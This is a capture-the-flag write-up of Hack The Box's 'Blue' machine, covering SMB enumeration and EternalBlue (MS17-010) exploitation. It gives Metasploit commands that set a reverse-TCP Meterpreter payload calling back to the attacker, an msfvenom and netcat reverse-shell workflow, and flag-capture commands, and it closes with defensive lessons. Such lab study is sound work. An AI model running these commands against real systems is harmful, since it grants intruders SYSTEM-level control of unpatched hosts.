# Blue

> **Details reconstructed from memory of my own completed walkthrough — exact commands/outputs may be paraphrased.**

**Platform:** Hack The Box  
**Difficulty:** Easy  
**Category:** Windows, SMB, remote code execution (MS17-010 / EternalBlue)

![OS](https://img.shields.io/badge/OS-Windows-blue?style=flat-square&logo=windows)

![CVE](https://img.shields.io/badge/CVE-2017--0144-critical?style=flat-square)

![Status](https://img.shields.io/badge/Status-Educational-blue?style=flat-square)

---

## Overview

Blue is one of the most recognizable retired Hack The Box machines and a classic first Windows box. It models a **Windows 7 SP1** host that was never patched against **MS17-010** — the SMBv1 vulnerability family publicly known as **EternalBlue**. The intended path is a single, well-documented remote code execution: enumerate SMB, confirm the host is vulnerable to MS17-010, and use the EternalBlue exploit to land a SYSTEM-level shell directly, with no separate privilege-escalation stage required.

I completed it as practice for the Windows side of my methodology — service enumeration against SMB, vulnerability confirmation before firing an exploit, and clean proof capture. It pairs well with the Linux boxes in this repo because it emphasizes a completely different attack surface (the Windows SMB stack) while keeping the overall workflow identical: recon → confirm → exploit → loot.

---

## Reconnaissance

I started with an **nmap** service scan against the target IP to map the attack surface:

```bash
nmap -sC -sV -p- -oN blue-full.txt <target-ip>
```

The results were textbook Windows-SMB:

- **135/tcp** — msrpc (Microsoft RPC endpoint mapper)
- **139/tcp** — netbios-ssn
- **445/tcp** — microsoft-ds (SMB)
- A spread of high ephemeral RPC ports

The OS fingerprint pointed at **Windows 7 / Server 2008 R2**, and SMB was clearly the primary (really the only) interesting service. On a Windows box exposing 445 with that OS version, the first thing I check is whether it's missing the MS17-010 patch.

### Confirming MS17-010

Rather than blindly firing an exploit, I confirmed the vulnerability first with nmap's dedicated script:

```bash
nmap -p445 --script smb-vuln-ms17-010 -oN blue-ms17.txt <target-ip>
```

The script reported the host as **VULNERABLE to MS17-010 (CVE-2017-0143 … 0148)**. That single line is the whole box — it tells you EternalBlue will work and that you can expect a SYSTEM shell on success.

I also noted that SMBv1 was enabled and anonymous/null session enumeration was limited, which is consistent with the default Windows 7 configuration this box emulates.

---

## Exploitation

### MS17-010 / EternalBlue background

**EternalBlue** exploits a buffer overflow in Microsoft's **SMBv1** implementation (`srv.sys`). The flaw lives in how the SMBv1 server handles specially crafted packets — specifically a mismatch when converting file-extended-attribute (FEA) lists between formats, which lets an attacker write past an allocated buffer in the non-paged kernel pool. Because the vulnerable code runs in kernel context, successful exploitation yields code execution as **NT AUTHORITY\SYSTEM**, the highest privilege level on Windows. There is no user shell to escalate from — you land at the top.

This is CVE-2017-0144 and friends, patched by Microsoft in **MS17-010** (March 2017). Blue models a host that never received that update.

### Option A — Metasploit (intended, reliable path)

The most reliable way to complete the box is the Metasploit module:

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <your-vpn-ip>
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check
run
```

- `check` re-confirms the target is vulnerable before launching.
- On success the module grooms the kernel pool, triggers the overflow, and returns a **Meterpreter session running as `NT AUTHORITY\SYSTEM`**.
- I verified context immediately with `getuid`, which returned SYSTEM.

The exploit can occasionally fail on the first attempt due to pool-grooming timing; re-running it one or two times is normal and expected on this machine.

### Option B — standalone exploit (manual understanding)

To understand the mechanics beyond a one-click module, EternalBlue can also be run from a public standalone script (the well-known `MS17-010` Python implementations, e.g. `zzz_exploit` / `send_and_execute`). The manual workflow is:

1. Generate a payload DLL/shellcode with `msfvenom` (e.g. a `windows/x64/shell_reverse_tcp`).
2. Start a matching listener (`nc -lvnp 4444` or a Metasploit `multi/handler`).
3. Run the exploit script against port 445, pointing it at the generated shellcode, to achieve the same SMBv1 kernel overflow and execute the payload.

I used the standalone path once purely to see the named pipe / FEA grooming steps in action; for actually completing the box, the Metasploit module is faster and more dependable.

---

## Post-Exploitation & Proof

Because the shell already runs as SYSTEM, there is **no privilege-escalation phase**. I went straight to collecting proof and basic host context:

```cmd
whoami                     # nt authority\system
systeminfo                 # confirm Win7 SP1, missing MS17-010 KB
ipconfig /all
```

I then captured the two proof flags per HTB convention:

- **User flag:** `C:\Users\<user>\Desktop\user.txt`
- **Root flag:** `C:\Users\Administrator\Desktop\root.txt`

From a Meterpreter session I grabbed them with `type` after `shell`, or directly via `cat` from the Meterpreter prompt. Since the session was already SYSTEM, both flags were readable without any further escalation.

> Lab credentials for the local VM copy of this box (`user` / `administrator`) were provided with the image for console access; they are **not** needed for the EternalBlue path, which never authenticates.

---

## Lessons Learned

Blue cemented a habit I apply to every Windows target: **when you see 445 open on an older Windows build, confirm MS17-010 before anything else.** A single nmap script decides the entire engagement, and confirming first avoids firing a kernel exploit blindly against a patched host (where EternalBlue can blue-screen the target).

It also made the **EternalBlue → SYSTEM** relationship concrete. Unlike the Linux boxes in this repo where foothold and privesc are distinct phases, a kernel-level SMB RCE collapses the whole chain into one step — a reminder that unpatched network-facing services are the highest-severity class of finding in a real assessment.

Finally, running both the Metasploit module and a standalone script taught me not to treat the exploit as a black box. Understanding the SMBv1 FEA-conversion overflow and the non-paged pool grooming is what separates "I ran a module" from "I understand why MS17-010 is one of the most impactful vulnerabilities ever disclosed." That directly informs the defensive takeaway: disable SMBv1, patch promptly, and never expose 445 to untrusted networks.
